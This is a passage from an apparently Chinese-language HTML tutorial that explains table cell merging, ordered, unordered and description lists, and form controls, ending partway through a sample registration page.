class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">cellpadding</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">cellspacing</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;500&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;249&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>性别<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span> 年龄 <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>刘德华<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span> 56 <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>张学友<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span> 58 <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>郭富城<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span> 51 <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>黎明<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span> 57 <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="单元格合并">单元格合并</h3><ul class="lvl-0"><li class="lvl-2"><p>跨行合并：rowspan=“合并单元格的个数”</p></li><li class="lvl-2"><p>跨列合并：colspan=“合并单元格的个数”</p></li></ul><p><img src="/2022/12/29/HTML/image-20200724114220209.png" alt="image-20200724114220209"></p><p><strong>先确定跨行还是跨列, 确定合并数量, 将要合并的标签删掉, over</strong></p><h3 id="案例2">案例2</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">cellpadding</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">cellspacing</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;500&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">rowspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="列表标签">列表标签</h2><h3 id="无序列表">无序列表</h3><p>&lt;ul&gt; 标签表示 HTML 页面中项目的无序列表，一般会以项目符号呈现列表项，而列表项使用&lt;li&gt; 标签定义。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>列表项1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>列表项2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>列表项3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span> <br>  ... <br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>&lt;ul&gt;中只能嵌套&lt;li&gt;标签</p><h3 id="有序列表">有序列表</h3><p>&lt;ol&gt;标签定义有序列表, &lt;li&gt;定义列表项</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>列表项1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>列表项2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>列表项3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span> <br>  ... <br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="自定义列表">自定义列表</h3><p>&lt;dl&gt; 标签用于定义描述列表（或定义列表），该标签会与 &lt;dt&gt;（定义项目/名字）和 &lt;dd&gt;（描述每一个项目/名字）一起使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>名词1<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>名词1解释1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>名词1解释2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="总结">总结</h3><table><thead><tr><th>标签名</th><th>定义</th><th>说明</th></tr></thead><tbody><tr><td>&lt;ul&gt;&lt;/ul&gt;</td><td>无序列表</td><td>只能包含li标签, 没有顺序</td></tr><tr><td>&lt;ol&gt;&lt;/ol&gt;</td><td>有序列表</td><td>只能包含li,有顺序</td></tr><tr><td>&lt;dl&gt;&lt;/dl&gt;</td><td>自定义列表</td><td>只能包含dt 和 dd</td></tr></tbody></table><h2 id="表单标签">表单标签</h2><h3 id="表单域">表单域</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;url地址&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;提交方式&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;表单域名称&quot;</span>&gt;</span><br>    各种表单元素控件<br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>常用属性</strong></p><table><thead><tr><th>属性</th><th>属性值</th><th>作用</th></tr></thead><tbody><tr><td>action</td><td>url地址</td><td>用于指定接收处理表单数据的服务器程序地址</td></tr><tr><td>method</td><td>get/post</td><td>用于设置表单数据的提交方式, 其取值为get或post</td></tr><tr><td>name</td><td>名称</td><td>用于指定表单的名称, 以区分同一个页面中的多个表单域</td></tr></tbody></table><h3 id="表单的组成">表单的组成</h3><p>在 HTML 中，一个完整的表单通常由<strong>表单域、表单控件（也称为表单元素）和 提示信息</strong>3个部分构成。</p><p><img src="/2022/12/29/HTML/image-20200724215256035.png" alt="image-20200724215256035"></p><h3 id="表单控件">表单控件</h3><h4 id="input表单">input表单</h4><blockquote><p>&lt;input type=“属性值” /&gt;</p></blockquote><p><strong>type属性的属性值</strong></p><p><img src="/2022/12/29/HTML/image-20200724215815151.png" alt="image-20200724215815151"></p><p><strong>input的其他属性</strong></p><p><img src="/2022/12/29/HTML/image-20200724215940073.png" alt="image-20200724215940073"></p><p><strong>input常用方式</strong></p><ol><li class="lvl-3"><p>type=&quot;password&quot;输入密码不显示</p></li><li class="lvl-3"><p>type=&quot;radio&quot;单选</p></li><li class="lvl-3"><p>type=&quot;checkbox&quot;多选</p></li><li class="lvl-3"><p>value=&quot;信息&quot;会在输入框中显示信息, 光标聚集信息仍然存在</p></li><li class="lvl-3"><p>placeholder=&quot;信息&quot;会在输入框中显示信息, 光标聚集信息消失</p></li><li class="lvl-3"><p>在多选或当选时name值一样</p></li></ol><p><strong>label标签</strong></p><p>&lt;label&gt; 标签为 input 元素定义标注（标签）。<br>&lt;label&gt; 标签用于绑定一个表单元素, 当点击&lt;label&gt; 标签内的文本时，浏览器就会自动将焦点(光标)转到或者 选择对应的表单元素上,用来增加用户体验.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;sex&quot;</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span>  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;sex&quot;</span> /&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="select表单">select表单</h4><p>下拉标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>选项1<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>选项2<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>选项3<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span> <br>  ... <br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="textarea表单">textarea表单</h4><p>内容较多时,文本域</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;3&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span> <br>   文本内容 <br> <span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span> <br></code></pre></td></tr></table></figure><ol><li class="lvl-3"><p>通过 &lt;textarea&gt; 标签可以轻松地创建多行文本输入框。</p></li><li class="lvl-3"><p>cols=“每行中的字符数” ，rows=“显示的行数”, 实际开发中不会使用，都是用 CSS 来改变大小</p></li></ol><h4 id="总结-2">总结</h4><p>(1) 表单域   form    使用场景:  提交区域内表单元素给后台服务器<br>(2) 文件域   file      是input type 属性值   使用场景: 上传文件<br>(3) 文本域   textarea    使用场景:  可以输入多行文字, 比如留言板  网站介绍等</p><h2 id="综合案例">综合案例</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;ie=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>综合案例-注册页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>青春不常在，抓紧谈恋爱<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;600&quot;</span> &gt;</span><br>        <span class="hljs-comment">&lt;!-- 第一行 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>性别:<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;nan&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;nan&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;images/man.jpg&quot;</span> &gt;</span> 男 <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>  <br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;nv&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;nv&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;images/women.jpg&quot;</span> &gt;</span> 女<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span> <br>            <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 第二行 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>生日:<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>--请选择年份--<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>2001<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>2002<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>2003<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>--请选择月份--<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>--请选择日--<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>        <br>            <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 第三行 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>所在地区<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;北京思密达&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 第四行 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>婚姻状况:<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;marry&quot;</span> <span class="hljs-attr">checked</span>=<span class="hljs-string">&quot;checked&quot;</span>&gt;</span>未婚  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;marry&quot;</span>&gt;</span>  已婚  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;marry&quot;</span>&gt;</span> 离婚<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>         <span class="hljs-comment">&lt;!-- 第五行 --&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>学历:<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;博士后&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>         <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>          <span class="hljs-comment">&lt;!-- 第六行 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>喜欢的类型:<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;love&quot;</span> &gt;</span> 妩媚的 <br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;love&quot;</span> &gt;</span> 可爱的 <br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;love&quot;</span> &gt;</span> 